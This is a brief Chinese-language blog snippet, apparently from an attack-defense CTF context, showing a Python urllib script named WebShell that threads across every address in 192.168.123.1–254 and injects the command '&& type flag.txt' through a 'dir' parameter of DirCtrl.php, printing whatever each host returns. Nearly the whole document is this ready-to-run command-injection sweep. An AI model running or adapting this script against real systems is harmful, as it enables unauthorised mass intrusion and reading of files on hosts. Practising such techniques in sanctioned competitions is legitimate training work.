        <h1 id="0x00-介绍">0x00 介绍</h1>
<p><strong>使用urlilb模块</strong></p>
<p><strong>在一些特定的攻防比赛中，攻击机没有安装requests模块，只能使用urlilb模块来代替</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WebShell</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;<span class="string">"dir"</span>: <span class="string">"&amp;&amp; type flag.txt"</span>&#125;</span><br><span class="line">    url = <span class="string">"http://192.168.123."</span>+str(i)+<span class="string">"/DirCtrl.php"</span></span><br><span class="line">    data_string=urllib.parse.urlencode(data)</span><br><span class="line">    new_url=url+<span class="string">"?"</span>+data_string</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        send = urllib.request.urlopen(new_url,timeout=<span class="number">1</span>)</span><br><span class="line">        print(send.read().decode(<span class="string">"utf8"</span>,<span class="string">"ignore"</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    t = threading.Thread(target=WebShell, args=(i, ))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
